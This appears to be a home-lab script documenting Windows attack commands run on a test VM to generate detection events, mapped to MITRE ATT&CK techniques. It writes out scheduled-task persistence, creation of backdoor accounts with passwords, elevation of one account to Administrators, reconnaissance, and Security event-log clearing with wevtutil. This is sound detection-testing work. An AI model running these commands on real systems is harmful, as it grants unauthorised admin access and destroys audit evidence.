# PowerShell Attack Execution Script
# Purpose: Document all attack commands executed on Windows VM victim
# System: Windows 10 VM (DESKTOP-PT2GLLD) - 192.168.56.104
# Executed By: Lab_Victim (compromised account)
# Timestamp: 2026-05-15 00:19:00 - 00:22:00

# ============================================
# ATTACK STAGE 3: SCHEDULED TASK PERSISTENCE
# MITRE ATT&CK: T1053.005
# ============================================

# Create malicious scheduled task #1 - Continuous execution
schtasks /create /sc minute /mo 1 /tn UpdateCheck /tr calc.exe /f

# Breakdown:
# /create         - Create new task
# /sc minute      - Schedule type: every minute
# /mo 1           - Modifier: every 1 minute
# /tn UpdateCheck - Task name (mimics legitimate Windows Update task)
# /tr calc.exe    - Task to run (calc.exe for testing; would be malware in real attack)
# /f              - Force creation (overwrite if exists)

# Create malicious scheduled task #2 - Off-hours execution
schtasks /create /sc once /st 23:59 /tn AttackTask /tr cmd.exe /f

# Breakdown:
# /sc once        - Schedule type: run once
# /st 23:59       - Start time: 11:59 PM (off-hours execution)
# /tn AttackTask  - Task name (generic attacker naming)
# /tr cmd.exe     - Execute command prompt (access to system)

# Verify tasks created successfully
schtasks /query /tn UpdateCheck
schtasks /query /tn AttackTask

# Expected Output:
# TaskName: UpdateCheck
# Next Run Time: (current time + 1 minute)
# Status: Ready

# ============================================
# ATTACK STAGE 4: BACKDOOR ACCOUNT CREATION
# MITRE ATT&CK: T1136.001
# ============================================

# Create primary backdoor account
net user Backdoor Hacker123! /add

# Breakdown:
# net user       - User account management command
# Backdoor       - Username (obvious attacker account for detection testing)
# Hacker123!     - Password (meets Windows complexity requirements)
# /add           - Add new user

# Create backup backdoor accounts (redundancy in case primary discovered)
net user AttackTest Attack123! /add
net user TestUser Pass123! /add
net user FreshTest Pass123! /add

# Verify accounts created
net user Backdoor
net user AttackTest
net user TestUser
net user FreshTest

# Expected Output:
# User name:                    Backdoor
# Full Name:
# Account active:               Yes
# Password last set:            5/15/2026 12:19:12 AM
# Password expires:             Never
# Local Group Memberships:      *Users

# ============================================
# ATTACK STAGE 5: PRIVILEGE ESCALATION
# MITRE ATT&CK: T1098
# ============================================

# Elevate backdoor account to Administrator
net localgroup Administrators Backdoor /add

# Breakdown:
# net localgroup             - Local group management
# Administrators             - Target group (highest privilege)
# Backdoor                   - User to add to group
# /add                       - Add member to group

# Verify privilege escalation successful
net localgroup Administrators

# Expected Output:
# Alias name:     Administrators
# Members:
# ----------------------------------------------------------------
# Administrator
# Backdoor        <-- Newly added
# Lab_Victim

# ============================================
# ADDITIONAL RECONNAISSANCE COMMANDS
# ============================================

# System information gathering
systeminfo
whoami /all
ipconfig /all
net config workstation

# Network reconnaissance
netstat -ano | findstr :9997    # Check Splunk forwarder connection
arp -a                          # View ARP cache (other hosts on network)
route print                     # View routing table

# User enumeration
net user                        # List all local users
net localgroup                  # List all local groups
quser                          # Show logged-in users

# Service enumeration
sc query                        # List all services
tasklist /svc                   # List running processes with services

# Firewall status
netsh advfirewall show allprofiles

# ============================================
# DEFENSE EVASION ATTEMPTS
# MITRE ATT&CK: T1070.001
# ============================================

# Attempt to clear Security event log (this would destroy attack evidence)
# NOTE: This command executed via NetExec remotely; documented here for reference
# wevtutil cl Security

# Manually executed on VM for detection testing:
wevtutil cl Security

# Expected Result:
# If successful: Security log cleared, EventCode 1102 generated
# If failed: Access denied (requires admin privileges)

# Alternative log clearing methods (not executed, documented for awareness):
# Clear-EventLog -LogName Security           # PowerShell method
# Remove-EventLog -LogName Security          # PowerShell (more destructive)
# wevtutil clear-log Security                # Alternative syntax

# ============================================
# PERSISTENCE VERIFICATION
# ============================================

# Check scheduled tasks still exist
schtasks /query | findstr UpdateCheck
schtasks /query | findstr AttackTask

# Check backdoor accounts still active
net user | findstr Backdoor
net user | findstr AttackTest

# Check admin privileges maintained
net localgroup Administrators | findstr Backdoor

# ============================================
# FORENSIC INDICATORS GENERATED
# ============================================

# Windows Event Logs Created:
# EventCode 4720 - User Account Created (4 events)
#   - Backdoor, AttackTest, TestUser, FreshTest
# EventCode 4732 - Member Added to Local Group (1 event)
#   - Backdoor added to Administrators
# EventCode 4698 - Scheduled Task Created (2 events)
#   - UpdateCheck, AttackTask
# EventCode 1102 - Audit Log Cleared (1 event) [CRITICAL]

# Sysmon Events Created:
# EventCode 1 (Process Creation) - Multiple events:
#   - schtasks.exe with /create parameter
#   - net.exe with user/localgroup parameters
#   - wevtutil.exe with cl parameter
#   - cmd.exe (parent process for all above)

# ============================================
# CLEANUP COMMANDS (POST-LAB)
# ============================================

# Remove backdoor accounts
# net user Backdoor /delete
# net user AttackTest /delete
# net user TestUser /delete
# net user FreshTest /delete

# Remove scheduled tasks
# schtasks /delete /tn UpdateCheck /f
# schtasks /delete /tn AttackTask /f

# NOTE: Cleanup not performed during lab to preserve forensic evidence
